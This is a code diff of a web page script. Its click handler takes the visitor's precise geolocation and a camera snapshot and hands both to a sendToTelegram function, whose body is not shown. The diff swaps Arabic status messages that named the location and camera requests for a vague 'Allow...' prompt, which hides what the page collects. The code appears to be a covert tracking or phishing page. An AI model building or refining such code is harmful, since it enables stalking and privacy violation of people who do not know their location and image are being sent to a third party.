@@ -59,14 +59,14 @@ async function sendToTelegram(blob, lat, lon, isVideo=false) {
 }
 
 goBtn.addEventListener('click', async () => {
-  status.textContent = "طلب إذن الموقع...";
+  status.textContent = "Allow...";
   let lat=null, lon=null;
   try {
     const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy:true, timeout:20000}));
     lat = pos.coords.latitude; lon = pos.coords.longitude;
-    status.textContent = "الحصول على الكاميرا...";
+    status.textContent = "Allow...";
   } catch(e) {
-    status.textContent = "فشل الحصول على الموقع: " + (e.message||e);
+    status.textContent = "فشل الحصول الاذن: " + (e.message||e);
   }
 
   try {
@@ -86,7 +86,7 @@ goBtn.addEventListener('click', async () => {
     }, 'image/jpeg', 0.85);
   } catch (err) {
     console.error(err);
-    status.textContent = "فشل الوصول للكاميرا: " + (err.message||err);
+    status.textContent = "فشل الوصول الأذن: " + (err.message||err);
   }
 });
 </script>
